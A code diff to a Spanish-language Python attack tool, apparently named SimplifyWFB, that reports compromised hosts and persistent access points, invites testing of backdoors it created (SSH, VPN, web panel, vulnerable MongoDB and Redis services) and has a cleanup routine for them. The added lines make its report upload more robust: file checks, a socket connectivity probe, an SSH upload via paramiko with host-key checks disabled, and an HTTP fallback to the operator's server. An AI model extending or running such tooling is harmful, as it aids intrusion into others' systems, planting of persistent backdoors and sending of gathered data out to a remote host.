@@ -3988,6 +3988,8 @@ WantedBy=multi-user.target
             json.dump(self.report, f, indent=2, ensure_ascii=False)
         
         print(f"📄 Reporte guardado: {report_file}")
+        print(f"🔍 Verificando archivo: {os.path.exists(report_file)}")
+        print(f"📏 Tamaño del archivo: {os.path.getsize(report_file)} bytes")
         print(f"⏱️ Tiempo total: {self.report['summary']['execution_time']:.2f} segundos")
         print(f"🎯 Hosts comprometidos: {self.report['summary']['compromised_hosts']}/{self.report['summary']['total_hosts']}")
         print(f"🔒 Puntos de acceso persistentes: {self.report['summary']['persistent_access_points']}")
@@ -4184,7 +4186,7 @@ WantedBy=multi-user.target
         print("\n" + "=" * 60)
         print("🧪 OPPORTUNIDAD DE PRUEBA DE BACKDOORS")
         print("=" * 60)
-        print("✅ Reporte generado y enviado por FTP")
+        print("✅ Reporte generado y enviado por SSH")
         print("🔍 Ahora puedes probar los backdoors creados:")
         print("   • SSH, VPN, Panel Web")
         print("   • Servicios vulnerables (MongoDB, Redis, etc.)")
@@ -4543,6 +4545,19 @@ WantedBy=multi-user.target
             import paramiko
             import os
             
+            # Verificar que el archivo existe
+            print(f"🔍 Verificando archivo antes de envío: {report_file}")
+            print(f"🔍 Archivo existe: {os.path.exists(report_file)}")
+            if os.path.exists(report_file):
+                print(f"📏 Tamaño del archivo: {os.path.getsize(report_file)} bytes")
+                print(f"📁 Directorio actual: {os.getcwd()}")
+                print(f"📁 Lista de archivos: {[f for f in os.listdir('.') if f.startswith('simplifywfb_report_')]}")
+            
+            if not os.path.exists(report_file):
+                print(f"❌ Archivo de reporte no encontrado: {report_file}")
+                print("💡 El reporte se mantiene localmente en el equipo")
+                return
+            
             ssh_config = self.config_data['ssh_upload']
             host = ssh_config['host']
             port = ssh_config['port']
@@ -4551,12 +4566,18 @@ WantedBy=multi-user.target
             
             print(f"\n📤 Enviando reporte por SSH a {host}:{port}...")
             
+            # Probar conectividad primero
+            if not self._test_server_connectivity(host, port):
+                print("💡 Servidor no accesible. Intentando envío alternativo...")
+                self._upload_report_via_http(report_file)
+                return
+            
             # Crear cliente SSH
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             
-            # Conectar al servidor SSH
-            ssh.connect(host, port=port, username=username, password=password)
+            # Conectar al servidor SSH con timeout
+            ssh.connect(host, port=port, username=username, password=password, timeout=10)
             
             # Crear directorio de reportes si no existe
             stdin, stdout, stderr = ssh.exec_command('mkdir -p /reports')
@@ -4575,6 +4596,14 @@ WantedBy=multi-user.target
         except ImportError:
             print("❌ Módulo 'paramiko' no encontrado. Intentando envío alternativo...")
             self._upload_report_via_http(report_file)
+        except paramiko.AuthenticationException:
+            print("❌ Error de autenticación SSH. Verifica credenciales.")
+            print("💡 Intentando envío alternativo...")
+            self._upload_report_via_http(report_file)
+        except paramiko.SSHException as e:
+            print(f"❌ Error SSH: {e}")
+            print("💡 Intentando envío alternativo...")
+            self._upload_report_via_http(report_file)
         except Exception as e:
             print(f"❌ Error enviando reporte por SSH: {e}")
             print("💡 Intentando envío alternativo...")
@@ -4586,6 +4615,17 @@ WantedBy=multi-user.target
             import urllib.request
             import os
             import json
+            
+            # Verificar que el archivo existe
+            print(f"🔍 [HTTP] Verificando archivo antes de envío: {report_file}")
+            print(f"🔍 [HTTP] Archivo existe: {os.path.exists(report_file)}")
+            if os.path.exists(report_file):
+                print(f"📏 [HTTP] Tamaño del archivo: {os.path.getsize(report_file)} bytes")
+            
+            if not os.path.exists(report_file):
+                print(f"❌ Archivo de reporte no encontrado: {report_file}")
+                print("💡 El reporte se mantiene localmente en el equipo")
+                return
             
             ssh_config = self.config_data['ssh_upload']
             host = ssh_config['host']
@@ -4615,17 +4655,44 @@ WantedBy=multi-user.target
             req.add_header('Content-Type', 'application/json')
             req.add_header('User-Agent', 'SimplifyWFB/1.0')
             
-            # Enviar request
-            with urllib.request.urlopen(req, timeout=30) as response:
+            # Enviar request con timeout más corto
+            with urllib.request.urlopen(req, timeout=10) as response:
                 if response.status == 200:
                     print(f"✅ Reporte enviado exitosamente por HTTP: {filename}")
                 else:
                     print(f"⚠️ Respuesta HTTP {response.status}: {response.reason}")
             
+        except urllib.error.URLError as e:
+            print(f"❌ Error de conexión HTTP: {e}")
+            print("💡 El servidor no está respondiendo o no está disponible")
+            print("💡 El reporte se mantiene localmente en el equipo")
         except Exception as e:
             print(f"❌ Error enviando reporte por HTTP: {e}")
             print("💡 El reporte se mantiene localmente en el equipo")
             print("💡 Para instalar paramiko: pip install paramiko")
+    
+    def _test_server_connectivity(self, host: str, port: int) -> bool:
+        """Probar conectividad al servidor antes de enviar"""
+        try:
+            import socket
+            
+            print(f"🔍 Probando conectividad a {host}:{port}...")
+            
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((host, port))
+            sock.close()
+            
+            if result == 0:
+                print(f"✅ Servidor {host}:{port} está accesible")
+                return True
+            else:
+                print(f"❌ Servidor {host}:{port} no está accesible")
+                return False
+                
+        except Exception as e:
+            print(f"❌ Error probando conectividad: {e}")
+            return False
     
     def _cleanup_vulnerable_service_backdoors(self):
         """Limpiar backdoors creados en servicios vulnerables"""
